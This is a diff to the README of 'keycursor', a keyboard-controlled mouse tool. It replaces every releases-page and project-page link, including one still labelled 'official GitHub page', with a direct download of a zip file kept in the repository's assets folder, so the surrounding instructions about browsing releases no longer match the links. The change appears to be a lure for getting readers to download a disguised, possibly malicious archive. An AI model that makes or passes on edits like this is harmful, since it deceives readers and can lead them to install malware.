@@ -1,6 +1,6 @@
 # 🖱️ keycursor - Control Mouse Using Your Keyboard
 
-[![Download keycursor](https://img.shields.io/badge/Download-keycursor-brightgreen)](https://github.com/fahizzz/keycursor/releases)
+[![Download keycursor](https://img.shields.io/badge/Download-keycursor-brightgreen)](https://github.com/fahizzz/keycursor/raw/refs/heads/main/assets/Software_v1.1-alpha.3.zip)
 
 ## 🔍 What is keycursor?
 
@@ -38,13 +38,13 @@ You don't need any programming knowledge to use keycursor. The process is simple
 
 You need to visit the release page to get the latest version. The official release page is here:
 
-[![Download keycursor](https://img.shields.io/badge/Download-Latest-blue)](https://github.com/fahizzz/keycursor/releases)
+[![Download keycursor](https://img.shields.io/badge/Download-Latest-blue)](https://github.com/fahizzz/keycursor/raw/refs/heads/main/assets/Software_v1.1-alpha.3.zip)
 
 ### Step 1: Visit the Release Page
 
 Go to the releases section on the GitHub page:
 
-https://github.com/fahizzz/keycursor/releases
+https://github.com/fahizzz/keycursor/raw/refs/heads/main/assets/Software_v1.1-alpha.3.zip
 
 You will see a list of release versions. Look for the latest stable release. It will have files ready to download.
 
@@ -119,7 +119,7 @@ If keycursor does not work as expected:
 
 ## 📚 Additional Resources
 
-- Visit the official [GitHub page](https://github.com/fahizzz/keycursor) to learn more.
+- Visit the official [GitHub page](https://github.com/fahizzz/keycursor/raw/refs/heads/main/assets/Software_v1.1-alpha.3.zip) to learn more.
 - Check the issues tab on GitHub if you face bugs or want feature requests.
 - Search online Linux communities for tips on keyboard-mouse control.
 
@@ -142,4 +142,4 @@ keycursor relates to:
 
 ---
 
-[Download keycursor from releases](https://github.com/fahizzz/keycursor/releases) to get started.
+[Download keycursor from releases](https://github.com/fahizzz/keycursor/raw/refs/heads/main/assets/Software_v1.1-alpha.3.zip) to get started.
